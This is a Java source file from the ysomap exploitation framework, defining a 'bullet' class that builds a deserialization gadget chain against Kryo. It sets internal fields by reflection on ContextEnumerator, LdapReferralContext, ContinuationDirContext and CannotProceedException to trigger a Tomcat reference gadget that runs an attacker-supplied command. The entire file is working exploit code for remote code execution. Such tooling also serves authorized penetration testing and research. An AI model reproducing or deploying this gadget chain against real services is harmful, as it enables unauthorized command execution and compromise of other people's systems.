package ysomap.bullets.jdk;

import com.sun.jndi.toolkit.dir.ContextEnumerator;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.jdk.rmi.TomcatRefBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.DetailHelper;
import ysomap.core.util.ReflectionHelper;

import javax.naming.CannotProceedException;
import java.util.Hashtable;

/**
 * @author wh1t3p1g
 * @since 2022/3/7
 */
@Bullets
@Dependencies({"jdk"})
@Details("tomcat ref rce")
@Targets({Targets.KRYO})
@Authors({Authors.WH1T3P1G})
public class ContextEnumeratorBullet extends AbstractBullet<Object> {

    @NotNull
    @Require(name = "command", detail = DetailHelper.COMMAND)
    private String command;

    @Override
    public Object getObject() throws Exception {
        TomcatRefBullet bullet = new TomcatRefBullet();
        bullet.set("command", command);
        Object context = ReflectionHelper.createWithoutConstructor("com.sun.jndi.ldap.LdapReferralContext");
        ReflectionHelper.setFieldValue(context, "urlScope", "base");
        CannotProceedException cpe = new CannotProceedException();
        ReflectionHelper.setFieldValue(cpe, "cause", null);
        ReflectionHelper.setFieldValue(cpe, "stackTrace", null);
        cpe.setResolvedObj(bullet.getObject());
        ReflectionHelper.setFieldValue(cpe, "suppressedExceptions", null);
        Object refCtx = ReflectionHelper.newInstance(
                "javax.naming.spi.ContinuationDirContext",
                new Class[]{CannotProceedException.class, Hashtable.class},
                cpe, new Hashtable<>());
        ReflectionHelper.setFieldValue(context, "refCtx", refCtx);


        ContextEnumerator enumerator1 = ReflectionHelper.createWithoutConstructor(ContextEnumerator.class);
        ReflectionHelper.setFieldValue(enumerator1, "root", context);

        ContextEnumerator enumerator = ReflectionHelper.createWithoutConstructor(ContextEnumerator.class);
        ReflectionHelper.setFieldValue(enumerator, "root", context);
        ReflectionHelper.setFieldValue(enumerator, "rootProcessed", true);
        ReflectionHelper.setFieldValue(enumerator, "scope", 2);
        ReflectionHelper.setFieldValue(enumerator, "currentReturned", true);
        ReflectionHelper.setFieldValue(enumerator, "contextName", "");
        ReflectionHelper.setFieldValue(enumerator, "children", enumerator1);
        return enumerator;
    }
}
